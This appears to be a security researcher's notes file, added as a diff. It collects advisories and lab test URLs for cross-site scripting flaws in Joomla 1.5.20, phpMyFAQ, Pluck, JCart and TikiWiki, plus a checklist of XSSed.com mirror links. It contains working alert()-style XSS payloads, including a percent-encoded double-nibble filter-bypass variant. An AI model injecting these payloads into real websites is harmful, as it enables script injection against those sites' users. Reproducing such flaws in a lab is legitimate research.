@@ -1,0 +1,165 @@
+http://secunia.com/advisories/20954/
+
+http://secunia.com/advisories/25124/
+
+http://secunia.com/advisories/26028/
+
+http://secunia.com/advisories/26618/
+
+http://secunia.com/advisories/41628/
+
+http://secunia.com/advisories/41817/
+
+http://secunia.com/advisories/41685/
+
+http://secunia.com/advisories/41704/
+
+http://secunia.com/advisories/41619/
+
+http://secunia.com/advisories/41625/
+
+http://secunia.com/advisories/41772/
+
+--------------------
+
+joomla////
+
+http://secunia.com/advisories/41772/
+
+http://developer.joomla.org/security/news/9-security/10-core-security/322-20101001-core-xss-vulnerabilities.html
+
+http://yehg.net/lab/pr0js/advisories/joomla/core/%5Bjoomla_1.5.20%5D_cross_site_scripting%28XSS%29
+
+http://yehg.net/lab/pr0js/training/view/misc/joomla-1.5.20_encoded-xss/joomla-1.5.20_encoded-xss.mp4
+
+&"><script>allert(/XSS/)</script>=XSS-ME
+
+&<@double_nibble_uri_8>"><script>alert(/XSS/)</script><@/double_nibble_uri_8>=XSS-ME
+
+&<@first_nibble_uri_10>"><script>alert(/XSS/)</script><@/first_nibble_uri_10>=XSS-ME
+
+http://trickster.dmst.aueb.gr/~dimitro/Joomla_1520_test1/index.php?option=com_content&view=category&layout=blog&id=31&Itemid=46&%%32%32%%33%65%%33%63%%37%33%%36%33%%37%32%%36%39%%37%30%%37%34%%33%65%%36%31%%36%63%%36%35%%37%32%%37%34%%32%38%%32%66%%35%38%%35%33%%35%33%%32%66%%32%39%%33%63%%32%66%%37%33%%36%33%%37%32%%36%39%%37%30%%37%34%%33%65=XSS-ME
+
+------------------
+
+phpMyFAQ///
+
+http://secunia.com/advisories/41625/
+
+http://www.securityfocus.com/bid/37180/exploit
+
+/"><script>alert("XSS")</script>
+
+http://trickster.dmst.aueb.gr/~dimitro/phpmyfaq-2.6.8/index.php/"><script>alert("XSS")</script>
+
+------------------
+
+Pluck///
+
+http://secunia.com/advisories/41619/
+
+http://www.htbridge.ch/advisory/xss_vulnerability_in_pluck.html
+
+http://holisticinfosec.org/content/view/154/45/
+
+http://www.pluck-cms.org/docs/docs:install
+
+http://trickster.dmst.aueb.gr/~dimitro/pluck-4.6.3/?file=kop1.php
+
+------------------
+
+JCart///
+
+http://secunia.com/advisories/41704/
+
+http://www.exploit-db.com/exploits/15171/
+
+http://p0deje.blogspot.com/
+
+http://trickster.dmst.aueb.gr/~dimitro/jcart-1.1/store.php
+
+http://trickster.dmst.aueb.gr/~dimitro/jcart-1.1/xss.html
+
+-------------------
+
+TikiWiki///
+
+http://secunia.com/advisories/26618/
+
+http://secunia.com/advisories/cve_reference/CVE-2007-4554/
+
+http://www.securityfocus.com/bid/25433
+
+http://www.securityfocus.com/archive/1/archive/1/477653/100/0/threaded
+
+http://tiki.org/InstallTiki
+
+http://trickster.dmst.aueb.gr/~dimitro/tikiwiki-1.9.6/tiki-index.php
+
+sto reminder pass dinw
+
+javascript:alert('XSS')
+
+<a href="javascript:alert('XSS')">
+
+XXSed.com
+
+1) http://www.xssed.com/mirror/70707/ - OK
+
+2) http://www.xssed.com/mirror/70704/ - OK
+
+3) http://www.xssed.com/mirror/70719/ - OK
+
+4) http://www.xssed.com/mirror/70721/ - OK
+
+5) http://www.xssed.com/mirror/70726/ - OK
+
+6) http://www.xssed.com/mirror/70735/ - OK
+
+7) http://www.xssed.com/mirror/70696/ - OK
+
+8) http://www.xssed.com/mirror/70346/ - OK
+
+9) http://www.xssed.com/mirror/70345/ - OK 
+
+10) http://www.xssed.com/mirror/69548/ - OK
+
+11) http://www.xssed.com/mirror/69254/ - OK
+
+12) http://www.xssed.com/mirror/68756/ - OK 
+
+13) http://www.xssed.com/mirror/68689/ - OK 
+
+14) http://www.xssed.com/mirror/68688/ - OK
+
+15) http://www.xssed.com/mirror/70652/ - OK
+
+16) http://www.xssed.com/mirror/67620/ - OK
+
+17) http://www.xssed.com/mirror/67530/ - OK
+
+18) http://www.xssed.com/mirror/67296/ - OK
+
+19) http://www.xssed.com/mirror/70589/ - OK
+
+20) http://www.xssed.com/mirror/70528/ - OK
+
+21) http://www.xssed.com/mirror/70534/ - OK
+
+22) http://www.xssed.com/mirror/70537/ - OK
+
+23) http://www.xssed.com/mirror/70353/ - OK
+
+24) http://www.xssed.com/mirror/70463/ - OK
+
+25) http://www.xssed.com/mirror/70495/ - OK
+
+26) http://www.xssed.com/mirror/70510/ - OK
+
+27) http://www.xssed.com/mirror/70523/ - OK
+
+28) http://www.xssed.com/mirror/70506/ - OK 
+
+29) http://www.xssed.com/mirror/70465/ - OK
+
+30) http://www.xssed.com/mirror/70354/ - OK
